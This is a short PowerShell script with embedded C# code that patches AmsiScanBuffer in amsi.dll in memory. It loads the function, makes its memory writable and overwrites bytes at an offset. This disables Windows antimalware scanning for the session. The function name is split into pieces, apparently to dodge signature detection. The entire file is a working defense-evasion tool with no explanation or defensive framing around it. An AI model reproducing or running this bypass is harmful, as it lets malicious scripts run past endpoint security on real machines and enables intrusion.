$Assem = (
    "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
)

$Source = @"
    using System;
    using System.Runtime.InteropServices;

    namespace Bypass
    {
        public class AMSI
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
            static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


            public static int Disable()
            {
                IntPtr TargetDLL = LoadLibrary("amsi.dll");
                IntPtr ASBPtr  = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");

                UIntPtr dwSize = (UIntPtr)5;
                uint Zero = 0;

                VirtualProtect(ASBPtr , dwSize, 0x40, out Zero);

                Byte[] Patch = { 0x31, 0xff, 0x90 };
                IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
                Marshal.Copy(Patch, 0, unmanagedPointer, 3);
                MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);

                return 0;
            }
        }
    }
"@

Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp

[Bypass.AMSI]::Disable()